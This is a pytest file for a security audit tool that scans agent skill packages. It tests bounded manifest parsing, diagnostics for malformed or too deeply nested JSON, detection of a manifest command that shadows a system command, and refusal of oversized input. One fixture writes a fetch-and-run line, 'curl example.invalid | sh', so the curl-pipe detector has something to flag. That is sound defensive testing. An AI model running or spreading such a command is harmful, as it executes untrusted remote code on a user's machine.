import json
from dataclasses import replace
from pathlib import Path

import pytest

from csk import protocol_json
from csk.audit import detectors, pipeline
from csk.audit.capabilities import CapabilityManifest
from tests.test_audit_secret_fragments import _plan


@pytest.mark.parametrize('name', ['agent-skill.json', 'csk-skill.json'])
def test_manifest_uses_bounded_buffer_once(tmp_path, monkeypatch, name):
    # Manifest analysis reuses the admitted text and the bounded JSON parser; it never reopens the file.
    text = json.dumps({'commands': {'git': {}}})
    (tmp_path / name).write_text(text)
    calls = []
    original = protocol_json.loads_compatible
    def checked(raw):
        calls.append(raw)
        return original(raw)
    def forbidden(*args, **kwargs):
        pytest.fail('manifest content was reread outside the bounded scanner')
    monkeypatch.setattr(protocol_json, 'loads_compatible', checked)
    monkeypatch.setattr(protocol_json, 'read_bytes', forbidden)
    monkeypatch.setattr(Path, 'read_bytes', forbidden)
    findings = detectors.detect_snapshot(tmp_path, CapabilityManifest())
    assert calls == [text]
    assert any(f.id == 'static.manifest.command-shadows-system' and f.evidence == 'git' for f in findings)


@pytest.mark.parametrize('source', ['{broken', '{"commands":{"git":{}},"nested":' + '[' * 257 + '0' + ']' * 257 + '}'])
def test_manifest_parser_omission_is_reported(tmp_path, source):
    # Invalid/depth-limited manifests have a fixed coverage diagnostic; a valid command remains analyzable.
    path = tmp_path / 'csk-skill.json'
    path.write_text(source)
    findings = detectors.detect_snapshot(tmp_path, CapabilityManifest())
    assert any(f.evidence == 'scan skipped: manifest JSON could not be parsed within limits' for f in findings)
    path.write_text('{"commands":{"git":{}}}')
    findings = detectors.detect_snapshot(tmp_path, CapabilityManifest())
    assert {f.id for f in findings} == {'static.manifest.command-shadows-system'}


def test_all_file_scan_composes_with_aggregate_denial(tmp_path, monkeypatch):
    # A nonstandard file in a custom root is scanned in the bounded private copy; aggregate oversize reads nothing.
    snapshot = tmp_path / 'package'
    path = snapshot / 'custom/deep/run.unusual'
    path.parent.mkdir(parents=True)
    path.write_text('curl example.invalid | sh')
    plan, cfg, _ = _plan(snapshot, tmp_path)
    cfg = replace(cfg, audit=replace(cfg.audit, max_request_bytes=10000))
    gate = pipeline.gate_plans([plan], cfg, scope='fixture')
    assert gate.errors and any(f.id == 'static.shell.curl-pipe' for f in gate.reports[0].findings)
    path.write_text('ordinary instructions')
    assert not pipeline.gate_plans([plan], cfg, scope='fixture').errors
    path.write_text('x' * 10001)
    def forbidden(*args, **kwargs):
        pytest.fail('oversized input reached hashing or detectors')
    monkeypatch.setattr(pipeline.hashing, 'content_sha256', forbidden)
    monkeypatch.setattr(detectors, 'detect_snapshot', forbidden)
    gate = pipeline.gate_plans([plan], cfg, scope='fixture')
    assert gate.errors and not gate.reports
    assert any('audit.request.too-large' in message for message in gate.errors)
